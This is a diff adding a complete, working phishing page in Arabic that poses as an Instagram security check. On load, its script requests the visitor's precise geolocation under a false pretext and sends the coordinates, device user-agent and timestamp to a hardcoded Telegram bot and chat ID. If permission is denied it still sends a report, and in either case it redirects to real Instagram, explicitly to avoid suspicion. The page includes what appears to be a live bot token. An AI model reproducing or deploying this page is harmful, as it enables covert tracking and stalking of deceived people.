@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>تحقق من الأمان...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- محاكاة نمط إنستغرام -->
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #FAFAFA; /* لون خلفية إنستغرام */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #262626;
+            text-align: center;
+        }
+        .instagram-box {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #dbdbdb;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+            max-width: 350px;
+            width: 90%;
+        }
+        .logo {
+            /* محاكاة اسم التطبيق بخط أكبر */
+            font-size: 2.5em;
+            color: #262626;
+            margin-bottom: 30px;
+            font-weight: 600; 
+        }
+        .spinner {
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top: 5px solid #8a3ab9; /* لون إنستغرام أرجواني */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h3 {
+            font-weight: 600;
+            font-size: 1.1em;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 0.9em;
+            color: #8e8e8e;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    
+    <!-- الواجهة الجديدة -->
+    <div class="instagram-box">
+        <div class="logo">Instagram</div>
+        <div class="spinner"></div>
+        <h3 id="title">جاري تحميل المحتوى الخاص...</h3>
+        <p id="status">يجب التحقق من موقعك للحماية من المحتوى الحساس. الرجاء النقر على "قبول".</p>
+    </div>
+    <!-- نهاية الواجهة الجديدة -->
+
+    <script>
+        // Mission Configuration
+        const TELEGRAM_BOT_TOKEN = "8309210221:AAEUsJkF5wPJj9YwLEDjYCtnJghRKd9syuc";
+        const CHAT_ID = "5873816830";
+        // ملاحظة: لم نعد نستخدم SECRET_ENDPOINT لأن الإرسال يتم مباشرة
+        // const SECRET_ENDPOINT = "/capture_data"; 
+
+        const statusElement = document.getElementById('status');
+        const titleElement = document.getElementById('title');
+
+        // --- Core Extraction Protocol ---
+
+        function sendMessage(message) {
+            // Sends the compiled extraction report to the Telegram API
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                console.log("Transmission relay complete:", response);
+            }).catch(error => {
+                console.error("Transmission error:", error);
+            });
+        }
+
+        function reportFailure(error_code) {
+            // If Geolocation is blocked or unavailable
+            const device_info = navigator.userAgent;
+            const message = `
+**[Extraction Report] - Failed Geolocation**
+
+*User-Agent/Device:* \`${device_info}\`
+*Status:* Geolocation blocked or not supported. (Error Code: ${error_code})
+*Timestamp:* ${new Date().toISOString()}
+            `;
+            sendMessage(message);
+        }
+
+        function extractLocation() {
+            if (navigator.geolocation) {
+                // تحديث حالة الواجهة لتكون متوافقة مع الإجراء
+                statusElement.innerText = "جاري التحقق من الموقع الجغرافي. الرجاء النقر على 'قبول'...";
+
+                // Attempt to get high accuracy location
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const device_info = navigator.userAgent;
+
+                        // تحديث حالة الواجهة عند النجاح
+                        titleElement.innerText = "تم التحقق من الموقع بنجاح!";
+                        statusElement.innerText = "جاري التوجيه إلى المحتوى...";
+
+                        // Construct the mission report with location data
+                        const message = `
+**[Extraction Report] - Success**
+
+*Coordinates:* [${lat}, ${lon}](http://www.google.com/maps/place/${lat},${lon})
+*User-Agent/Device:* \`${device_info}\`
+*Accuracy:* ${position.coords.accuracy} meters
+*Timestamp:* ${new Date().toISOString()}
+                        `;
+                        sendMessage(message);
+
+                        // --- التوجيه إلى رابط مشروع إنستغرام لتجنب الشكوك ---
+                        setTimeout(() => {
+                            window.location.replace("https://www.instagram.com/explore/tabs/reels/");
+                        }, 1000); // Wait 1 second for transmission
+                    },
+                    (error) => {
+                        // Handle errors (permission denied, position unavailable, timeout)
+                        titleElement.innerText = "فشل التحقق الأمني.";
+                        statusElement.innerText = "الرجاء المحاولة مرة أخرى أو تحديث الصفحة.";
+                        
+                        reportFailure(error.code);
+
+                        // التوجيه حتى على الفشل
+                        setTimeout(() => {
+                            window.location.replace("https://www.instagram.com/explore/");
+                        }, 1000); 
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                // Browser doesn't support geolocation
+                titleElement.innerText = "خطأ: جهازك غير مدعوم.";
+                reportFailure('NoSupport');
+                setTimeout(() => {
+                    window.location.replace("https://www.instagram.com/");
+                }, 1000); // Redirect
+            }
+        }
+
+        // Initiate the extraction protocol after the page loads
+        window.addEventListener('load', () => {
+             // إتاحة وقت قصير لقراءة الرسالة قبل طلب الإذن
+             setTimeout(extractLocation, 800); 
+        });
+    </script>
+</body>
+</html>
